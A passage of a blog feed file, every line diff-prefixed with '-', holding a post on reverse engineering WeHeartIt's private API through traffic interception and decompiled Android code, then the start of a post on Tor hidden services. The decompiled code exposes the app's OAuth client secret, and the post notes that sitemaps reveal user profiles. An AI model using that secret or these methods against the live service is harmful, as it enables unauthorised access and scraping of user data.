-<p>Dynamic analysis is generally a bit quicker and can help give a good overview into how the application functions. By <a href="http://jordan-wright.github.io/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp/">intercepting traffic using a proxy</a>, we can easily analyze the structure of requests/responses in use by the application.</p>
-
-<h4>Registration &amp; Authentication</h4>
-
-<p>Loading up the WHI iPhone app and attempting to register an account shows the following request/response:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>POST /api/users HTTP/1.1
-</span><span class='line'>Host: api.weheartit.com
-</span><span class='line'>
-</span><span class='line'>&lt;snip&gt;
-</span><span class='line'>client_id=redacted
-</span><span class='line'>&client_secret=redacted
-</span><span class='line'>&user[email]=redacted
-</span><span class='line'>&user[name]=redacted
-</span><span class='line'>&user[password]=redacted
-</span><span class='line'>&user[username]=redacted
-</span><span class='line'>
-</span><span class='line'>{
-</span><span class='line'>    "result":"success",
-</span><span class='line'>    "object":
-</span><span class='line'>    {   "id":27215547,
-</span><span class='line'>            "username":"jordan_test2",
-</span><span class='line'>            "name":"Jordan Test",
-</span><span class='line'>            "location":"",
-</span><span class='line'>            "bio":"",
-</span><span class='line'>            &lt;snip&gt;
-</span><span class='line'>            "public_account":true,
-</span><span class='line'>            "verified":false,
-</span><span class='line'>            "created_at":"2014-10-12T18:38:35Z",
-</span><span class='line'>            "email":"redacted",
-</span><span class='line'>            "cover_image": { &lt;snip&gt; }
-</span><span class='line'>    }
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p><em>Note: I originally contacted the WHI security team since the login page (and every other page) was served via HTTP. This has since been fixed.</em></p>
-
-<p>Registering an account automatically logs the user in. This launches the OAuth2 authentication flow to generate an access token which is used in an <code>Authorization: Bearer</code> header for all API calls:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>POST /oauth/token HTTP/1.1
-</span><span class='line'>Host: api.weheartit.com
-</span><span class='line'>
-</span><span class='line'>&lt;snip&gt;
-</span><span class='line'>client_id=redacted
-</span><span class='line'>&client_secret=redacted
-</span><span class='line'>&grant_type=password
-</span><span class='line'>&password=redacted
-</span><span class='line'>&username=redacted
-</span><span class='line'>
-</span><span class='line'>{
-</span><span class='line'>    "access_token":"redacted",
-</span><span class='line'>    "token_type":"bearer",
-</span><span class='line'>    "expires_in":31104000,
-</span><span class='line'>    "refresh_token":"redacted",
-</span><span class='line'>    "scope":"public"
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This token is then used to make API calls to the WeHeartIt backend using a RESTful JSON API. Here are a couple of examples of this (some response details have been removed for brevity):</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>GET /api/v2/entries/85847648 HTTP/1.1
-</span><span class='line'>Host: api.weheartit.com
-</span><span class='line'>Authorization: Bearer [redacted]
-</span><span class='line'>
-</span><span class='line'>{
-</span><span class='line'>    "id": 85847648,
-</span><span class='line'>    "title": "Colors",
-</span><span class='line'>    &lt;snip&gt;
-</span><span class='line'>    "hearts_count": 11285,
-</span><span class='line'>    "created_at": "2013-11-10T17:09:49Z",
-</span><span class='line'>    "hearted": false,
-</span><span class='line'>    "via_hearts_count": 9919,
-</span><span class='line'>    "tags": [&lt;snip&gt;],
-</span><span class='line'>    "creator": {
-</span><span class='line'>        "id": 6043210,
-</span><span class='line'>        "username": "Natasja4205",
-</span><span class='line'>        &lt;snip&gt;
-</span><span class='line'>    },
-</span><span class='line'>    "user": {
-</span><span class='line'>        "id": 6043210,
-</span><span class='line'>        "username": "Natasja4205",
-</span><span class='line'>        &lt;snip&gt;
-</span><span class='line'>    }
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>GET /api/v2/users/27215547 HTTP/1.1
-</span><span class='line'>Host: api.weheartit.com
-</span><span class='line'>Authorization: Bearer [redacted]
-</span><span class='line'>
-</span><span class='line'>{
-</span><span class='line'>    "id": 27215547,
-</span><span class='line'>    "username": "jordan_test2",
-</span><span class='line'>    "name": "Jordan Test",
-</span><span class='line'>    "avatar": [&lt;snip&gt;],
-</span><span class='line'>    "public_account": true,
-</span><span class='line'>    "verified": false,
-</span><span class='line'>    "location": null,
-</span><span class='line'>    "bio": null,
-</span><span class='line'>    "link": null,
-</span><span class='line'>    "hearts_count": 0,
-</span><span class='line'>    "following_count": 1,
-</span><span class='line'>    "followers_count": 2,
-</span><span class='line'>    "sets_count": 0,
-</span><span class='line'>    "created_at": "2014-10-12T18:38:35Z",
-</span><span class='line'>    "cover": {&lt;snip&gt;}
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Great &ndash; we have an API! We could likely automate this app crawling to enumerate the available API calls and parameters. However, to get a more comprehensive idea as to what exact API endpoints are available, let&rsquo;s go straight to the source.</p>
-
-<h3>Static Analysis</h3>
-
-<p>Now that we have a feel of how the application operates, let&rsquo;s verify our findings by <a href="http://jordan-wright.github.io/blog/2014/08/10/decompiling-android-apps-the-easy-way/">decompiling the Android app</a> and doing some static analysis.</p>
-
-<h4>App Structure</h4>
-
-<p>The app has quite a few dependencies, but the core package (<code>com.weheartit</code>) is fairly straight-forward. The API we are concerned with is located at <code>com.weheartit.api</code>. Searching for the string &ldquo;/api&rdquo;, we can find that the bulk of the API functionality is found in APIRequest.java and APIRequestv2.java</p>
-
-<h4>APIRequest.java</h4>
-
-<p>APIRequest.java essentially contains the schema for version 1 of the OAuth enabled RESTful API. For example, we can find the OAuth <code>client_id</code> and <code>client_secret</code> parameters used by the Android app to get an access token:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="n">Map</span> <span class="n">map</span><span class="o">,</span> <span class="n">LoginServices</span> <span class="n">loginservices</span><span class="o">,</span> <span class="n">ApiResponseCallback</span> <span class="n">apiresponsecallback</span><span class="o">)</span>
-</span><span class='line'>    <span class="o">{</span>
-</span><span class='line'>        <span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;client_id&quot;</span><span class="o">,</span> <span class="s">&quot;25ieooqr&quot;</span><span class="o">);</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;client_secret&quot;</span><span class="o">,</span> <span class="s">&quot;zlype4airg41b33uwafbe8a6p8bwcgiw&quot;</span><span class="o">);</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;grant_type&quot;</span><span class="o">,</span> <span class="s">&quot;password&quot;</span><span class="o">);</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">putAll</span><span class="o">(</span><span class="n">map</span><span class="o">);</span>
-</span><span class='line'>        <span class="n">a</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="s">&quot;oauth/token&quot;</span><span class="o">,</span> <span class="n">hashmap</span><span class="o">,</span> <span class="k">new</span> <span class="n">OAuthDataResponseHandler</span><span class="o">(</span><span class="n">apiresponsecallback</span><span class="o">,</span> <span class="n">LoginServices</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">loginservices</span><span class="o">)));</span>
-</span><span class='line'>    <span class="o">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This function is used to obtain an access token using the appropriate LoginServices call. After we have an access token associated with a <code>User</code> object, this access token is used in subsequent API requests. We can enumerate through the functions in APIRequest.java to find each of the valid API calls, as well as the arguments to each call. Here are a couple of examples (more comprehensive documentation below):</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="n">UserSettings</span> <span class="n">usersettings</span><span class="o">,</span> <span class="n">ApiResponseCallback</span> <span class="n">apiresponsecallback</span><span class="o">)</span>
-</span><span class='line'>    <span class="o">{</span>
-</span><span class='line'>        <span class="n">User</span> <span class="n">user</span> <span class="o">=</span> <span class="n">WhiSession</span><span class="o">.</span><span class="na">b</span><span class="o">();</span>
-</span><span class='line'>        <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="na">getAccessToken</span><span class="o">();</span>
-</span><span class='line'>        <span class="n">WhiLog</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">&quot;ApiRequest&quot;</span><span class="o">,</span> <span class="o">(</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;updateUserSettings() for user (&quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getId</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;)&quot;</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
-</span><span class='line'>        <span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">(</span><span class="mi">12</span><span class="o">);</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;access_token&quot;</span><span class="o">,</span> <span class="n">s</span><span class="o">);</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[name]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getFullName</span><span class="o">());</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[username]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getUsername</span><span class="o">());</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[email]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getEmail</span><span class="o">());</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[bio]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getBio</span><span class="o">());</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[location]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getLocation</span><span class="o">());</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[link]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getLink</span><span class="o">());</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[show_unsafe_content]&quot;</span><span class="o">,</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">usersettings</span><span class="o">.</span><span class="na">isUnsafeContentEnabled</span><span class="o">()));</span>
-</span><span class='line'>        <span class="o">&lt;</span><span class="nl">snip:</span> <span class="n">other</span> <span class="n">settings</span><span class="o">&gt;</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;privacy_options[public]&quot;</span><span class="o">,</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">usersettings</span><span class="o">.</span><span class="na">isUserPublic</span><span class="o">()));</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;privacy_options[findable]&quot;</span><span class="o">,</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">usersettings</span><span class="o">.</span><span class="na">isUserFindable</span><span class="o">()));</span>
-</span><span class='line'>        <span class="n">a</span><span class="o">.</span><span class="na">c</span><span class="o">(</span><span class="s">&quot;api/settings&quot;</span><span class="o">,</span> <span class="n">hashmap</span><span class="o">,</span> <span class="k">new</span> <span class="n">ApiOperationResponseHandler</span><span class="o">(</span><span class="n">apiresponsecallback</span><span class="o">,</span> <span class="s">&quot;Failed to update user settings&quot;</span><span class="o">));</span>
-</span><span class='line'>    <span class="o">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="kt">long</span> <span class="n">l</span><span class="o">,</span> <span class="n">Long</span> <span class="n">long1</span><span class="o">,</span> <span class="n">ApiResponseCallback</span> <span class="n">apiresponsecallback</span><span class="o">)</span>
-</span><span class='line'>    <span class="o">{</span>
-</span><span class='line'>        <span class="n">Object</span> <span class="n">aobj</span><span class="o">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">3</span><span class="o">];</span>
-</span><span class='line'>        <span class="n">aobj</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">s</span><span class="o">;</span>
-</span><span class='line'>        <span class="n">aobj</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="n">Long</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">l</span><span class="o">);</span>
-</span><span class='line'>        <span class="n">aobj</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="o">=</span> <span class="n">long1</span><span class="o">;</span>
-</span><span class='line'>        <span class="n">WhiLog</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="s">&quot;ApiRequest&quot;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">&quot;getEntryCollectionDetails() with %s, %s, %s&quot;</span><span class="o">,</span> <span class="n">aobj</span><span class="o">));</span>
-</span><span class='line'>        <span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;access_token&quot;</span><span class="o">,</span> <span class="n">s</span><span class="o">);</span>
-</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">long1</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
-</span><span class='line'>        <span class="o">{</span>
-</span><span class='line'>            <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;heart_id&quot;</span><span class="o">,</span> <span class="n">long1</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
-</span><span class='line'>        <span class="o">}</span>
-</span><span class='line'>        <span class="n">a</span><span class="o">.</span><span class="na">a</span><span class="o">((</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;api/entry_sets/&quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">l</span><span class="o">).</span><span class="na">toString</span><span class="o">(),</span> <span class="n">hashmap</span><span class="o">,</span> <span class="k">new</span> <span class="n">EntryListResponseHandler</span><span class="o">(</span><span class="n">apiresponsecallback</span><span class="o">,</span> <span class="n">c</span><span class="o">));</span>
-</span><span class='line'>    <span class="o">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>APIRequestv2.java</h4>
-
-<p>It appears as though the backend API is being upgraded to a new version, as evidenced by the existence of APIRequestv2.java. Additionally, there are some endpoints that are located at <code>/api/v2/*</code>. Here are a couple of examples:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="kt">long</span> <span class="n">l</span><span class="o">,</span> <span class="kt">int</span> <span class="n">i</span><span class="o">,</span> <span class="n">ApiResponseCallback</span> <span class="n">apiresponsecallback</span><span class="o">)</span>
-</span><span class='line'>    <span class="o">{</span>
-</span><span class='line'>        <span class="n">WhiLog</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="s">&quot;ApiRequestV2&quot;</span><span class="o">,</span> <span class="o">(</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;getUserEntryCollections() with accessToken &quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;, &quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">l</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;, &quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">i</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
-</span><span class='line'>        <span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;access_token&quot;</span><span class="o">,</span> <span class="n">s</span><span class="o">);</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;page&quot;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">i</span><span class="o">));</span>
-</span><span class='line'>        <span class="n">e</span><span class="o">.</span><span class="na">a</span><span class="o">((</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;api/v2/users/&quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">l</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;/collections&quot;</span><span class="o">).</span><span class="na">toString</span><span class="o">(),</span> <span class="n">hashmap</span><span class="o">,</span> <span class="k">new</span> <span class="n">EntryCollectionListV2ResponseHandler</span><span class="o">(</span><span class="n">apiresponsecallback</span><span class="o">,</span> <span class="n">a</span><span class="o">));</span>
-</span><span class='line'>    <span class="o">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="n">Long</span> <span class="n">long1</span><span class="o">,</span> <span class="n">ApiPagedResponseCallback</span> <span class="n">apipagedresponsecallback</span><span class="o">)</span>
-</span><span class='line'>    <span class="o">{</span>
-</span><span class='line'>        <span class="n">WhiLog</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="s">&quot;ApiRequestV2&quot;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">&quot;getUserDashboard() with %s, %d&quot;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span>
-</span><span class='line'>            <span class="n">s</span><span class="o">,</span> <span class="n">long1</span>
-</span><span class='line'>        <span class="o">}));</span>
-</span><span class='line'>        <span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
-</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;access_token&quot;</span><span class="o">,</span> <span class="n">s</span><span class="o">);</span>
-</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">long1</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
-</span><span class='line'>        <span class="o">{</span>
-</span><span class='line'>            <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;before&quot;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">long1</span><span class="o">));</span>
-</span><span class='line'>        <span class="o">}</span>
-</span><span class='line'>        <span class="n">e</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="s">&quot;api/v2/user/dashboard&quot;</span><span class="o">,</span> <span class="n">hashmap</span><span class="o">,</span> <span class="k">new</span> <span class="n">UserDashboardResponseHandler</span><span class="o">(</span><span class="n">apipagedresponsecallback</span><span class="o">,</span> <span class="n">b</span><span class="o">));</span>
-</span><span class='line'>    <span class="o">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h3>API Documentation</h3>
-
-<p>I have created a repository, <a href="http://github.com/jordan-wright/weheartit-api">weheartit-api</a>, containing the full details found from this short study. The information in the repo is by no means comprehensive (consider it a work in progress), but it will hopefully shed some light into the available API functionality.</p>
-
-<h3>WHI Sitemaps</h3>
-
-<p>While on the subject of WHI, there are a couple of other interesting facts worth mentioning. For example, if your goal is to get general information about users on the network, there is no need to use the API! In fact, to help Google crawl the network, WHI publishes the following information in its <code>sitemaps</code> files:</p>
-
-<ul>
-<li>Username</li>
-<li>Link to Profile</li>
-<li>Date Modified</li>
-<li>List of Collections</li>
-</ul>
-
-
-<p>You can find these files here:</p>
-
-<ul>
-<li><a href="http://sitemaps.weheartit.com/collections.xml">http://sitemaps.weheartit.com/collections.xml</a></li>
-<li><a href="http://sitemaps.weheartit.com/entry_groups.xml">http://sitemaps.weheartit.com/entry_groups.xml</a></li>
-<li><a href="http://sitemaps.weheartit.com/entries.xml">http://sitemaps.weheartit.com/entries.xml</a></li>
-<li><a href="http://sitemaps.weheartit.com/popular_images.xml">http://sitemaps.weheartit.com/popular_images.xml</a></li>
-<li><a href="http://sitemaps.weheartit.com/users.xml">http://sitemaps.weheartit.com/users.xml</a></li>
-<li><a href="http://sitemaps.weheartit.com/tags.xml">http://sitemaps.weheartit.com/tags.xml</a></li>
-</ul>
-
-
-<h3>Conclusion</h3>
-
-<p>For not being exposed to developers, the API supported by WHI is surprisingly robust and complete. While this effort was simply a reverse engineering project out of curiosity, I hope that showing what the API is capable of will encourage WHI devs to open the official API to everyone.</p>
-
-<p>As always, let me know if you have any questions or comments!</p>
-
-<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Creating Tor Hidden Services with Python]]></title>
-    <link href="http://jordan-wright.github.io/blog/2014/10/06/creating-tor-hidden-services-with-python/"/>
-    <updated>2014-10-06T20:00:00-05:00</updated>
-    <id>http://jordan-wright.github.io/blog/2014/10/06/creating-tor-hidden-services-with-python</id>
-    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/hidden_services.png"/></p>
-
-<h3>Introduction</h3>
-
-<p>Tor is often used to protect the anonymity of someone who is trying to connect to a service. However, it is also possible to use Tor to protect the anonymity of a service provider via <a href="https://www.torproject.org/docs/hidden-services.html.en"><strong><em>hidden services</em></strong></a>. These services, operating under the <code>.onion</code> TLD, allow publishers to anonymously create and host content viewable only by other Tor users.</p>
-
-<p>The Tor project has <a href="https://www.torproject.org/docs/tor-hidden-service.html.en">instructions</a> on how to create hidden services, but this can be a manual and arduous process if you want to setup multiple services. This post will show how we can use the fantastic <code>stem</code> Python library to automatically create and host a Tor hidden service.</p>
-
-<!--more-->
-
-
-<h3>Creating Hidden Services Manually</h3>
-
-<p>The <a href="https://www.torproject.org/docs/tor-hidden-service.html.en#two">instructions provided by the Tor project</a> show that creating hidden services simply involves setting up the service locally (such as a web server listening on localhost), and then setting a few configuration options to make the service available via Tor.</p>
-
-<p>There are two configuration settings necessary to setup a hidden service: <code>HiddenServiceDir</code>, the directory to store the <code>hostname</code> and <code>private_key</code> files, and <code>HiddenServicePort</code>, the ports used to proxy hidden service connections.</p>
-
-<p>As the instructions show, each hidden service requires a variation of the following two lines to be present in the <code>torrc</code> configuration file (setting the directory, host, and ports appropriately):</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
